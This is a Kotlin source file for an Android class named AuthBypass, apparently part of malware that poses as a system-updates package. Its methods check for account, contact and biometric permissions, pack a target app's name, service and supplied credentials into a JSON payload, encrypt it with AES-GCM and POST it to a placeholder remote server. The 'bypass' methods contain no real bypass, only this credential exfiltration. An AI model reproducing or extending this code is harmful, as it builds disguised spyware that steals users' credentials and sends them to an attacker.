package com.system.updates.modules.network

import android.Manifest
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.util.Base64
import androidx.core.content.ContextCompat
import com.system.updates.core.CryptoManager
import com.system.updates.core.NetworkUtils
import org.json.JSONObject
import java.security.SecureRandom
import javax.crypto.Cipher
import javax.crypto.spec.GCMParameterSpec
import javax.crypto.spec.SecretKeySpec

class AuthBypass(private val context: Context) {
    private val crypto = CryptoManager(context)
    private val network = NetworkUtils(context)
    private val random = SecureRandom()

    fun tryBypass(targetPackage: String, service: String, credentials: JSONObject? = null): String {
        return when (val sdk = Build.VERSION.SDK_INT) {
            in 21..22 -> attemptLollipopBypass(targetPackage, service, credentials)
            in 23..25 -> attemptMarshmallowBypass(targetPackage, service, credentials)
            in 26..28 -> attemptOreoBypass(targetPackage, service, credentials)
            else -> attemptModernBypass(targetPackage, service, credentials)
        }
    }

    private fun attemptLollipopBypass(pkg: String, svc: String, cred: JSONObject?): String {
        if (!hasPermission(Manifest.permission.GET_ACCOUNTS)) return "ERR_PERMISSION"
        return encryptAndSend(createPayload("lollipop_accounts", pkg, svc, cred))
    }

    private fun attemptMarshmallowBypass(pkg: String, svc: String, cred: JSONObject?): String {
        if (!hasPermission(Manifest.permission.READ_CONTACTS)) return "ERR_PERMISSION"
        return encryptAndSend(createPayload("marshmallow_auth", pkg, svc, cred))
    }

    private fun attemptOreoBypass(pkg: String, svc: String, cred: JSONObject?): String {
        if (!hasPermission(Manifest.permission.USE_BIOMETRIC) && !hasPermission(Manifest.permission.USE_FINGERPRINT))
            return "ERR_PERMISSION"
        return encryptAndSend(createPayload("oreo_biometric", pkg, svc, cred))
    }

    private fun attemptModernBypass(pkg: String, svc: String, cred: JSONObject?): String {
        if (!hasPermission(Manifest.permission.USE_BIOMETRIC)) return "ERR_PERMISSION"
        return encryptAndSend(createPayload("modern_biometric", pkg, svc, cred))
    }

    private fun createPayload(method: String, pkg: String, svc: String, cred: JSONObject?): JSONObject {
        return JSONObject().apply {
            put("method", method)
            put("package", pkg)
            put("service", svc)
            put("credentials", cred ?: JSONObject())
        }
    }

    private fun hasPermission(perm: String): Boolean {
        return if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
        } else {
            true
        }
    }

    private fun encryptAndSend(data: JSONObject): String {
        val key = crypto.deriveDeviceKey()
        val iv = ByteArray(12).also { random.nextBytes(it) }
        val cipher = Cipher.getInstance("AES/GCM/NoPadding")
        cipher.init(Cipher.ENCRYPT_MODE, SecretKeySpec(key, "AES"), GCMParameterSpec(128, iv))
        val encrypted = cipher.doFinal(data.toString().toByteArray())
        val full = iv + encrypted
        val b64 = Base64.encodeToString(full, Base64.NO_WRAP)
        return network.httpPost("https://your-server.com/auth", "data=$b64")
    }
}